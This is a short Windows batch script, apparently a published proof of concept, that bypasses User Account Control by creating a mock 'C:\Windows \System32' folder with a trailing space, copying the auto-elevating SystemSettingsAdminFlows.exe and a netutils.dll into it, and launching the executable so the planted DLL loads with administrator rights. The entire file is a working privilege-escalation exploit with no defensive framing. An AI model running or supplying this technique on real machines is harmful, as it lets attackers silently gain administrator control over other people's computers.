@echo off
echo.
echo #### UAC Bypass In The Wild By @404death ####
mkdir "\\?\C:\Windows " 
mkdir "\\?\C:\Windows \System32"
echo  [+] file copying ...
copy "C:\Windows\System32\SystemSettingsAdminFlows.exe" "C:\Windows \System32\"
echo  [+] file copying ...
copy "netutils.dll" "C:\Windows \System32\"
"C:\Windows \System32\SystemSettingsAdminFlows.exe"
echo  [-] UAC Bypassed ?
